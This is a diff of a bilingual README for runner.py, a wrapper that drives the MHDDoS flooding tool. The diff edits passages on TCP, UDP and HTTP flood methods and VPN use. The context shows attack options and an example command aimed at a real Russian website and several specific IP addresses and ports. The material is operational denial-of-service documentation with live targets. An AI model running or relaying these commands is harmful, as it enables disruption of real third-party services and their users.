@@ -86,14 +86,6 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
 ## Документація
 
-Для цілей HTTP(S) метод атаки вибирається випадковим чином із параметра `--http-methods` (замовчування див. нижче).
-
-Для цілей TCP методом атаки є TCP FLOOD
-
-Для цілей UDP методом атаки є UDP FLOOD.  
-**Для UDP ПОТРІБЕН VPN**, проксі не підтримується.  
-Окремий параметр `--udp-threads` задає навантаження, за замовчуванням - 1, **ЗБІЛЬШУВАТИ ПОВІЛЬНО**, будьте обережні
-
     usage: runner.py target [target ...]
                      [-t THREADS] 
                      [-p PERIOD]
@@ -116,7 +108,7 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
       --debug                Enable debug output from MHDDoS
       --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
-      --udp-threads 1        Threads to run per UDP target (default is 1)
+      --udp-threads 1        Threads to run per UDP target (default is 1, change carefully)
 
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
@@ -185,7 +177,7 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
 
       --debug                Enable debug output from MHDDoS
       --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
-      --udp-threads 1        Threads to run per UDP target (default is 1)
+      --udp-threads 1        Threads to run per UDP target (default is 1, change carefully)
 
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
@@ -193,14 +185,6 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
                              (https://github.com/MHProDev/MHDDoS)
 
 # Examples
-
-For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).
-
-For TCP targets, attack method is TCP FLOOD
-
-For UDP targets, attack method is UDP FLOOD.   
-**VPN IS REQUIRED FOR UDP**, proxying is not supported.  
-Separate parameter `--udp-threads` controls the load, the default is 1, **INCREASE SLOWLY**, be careful
 
     python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
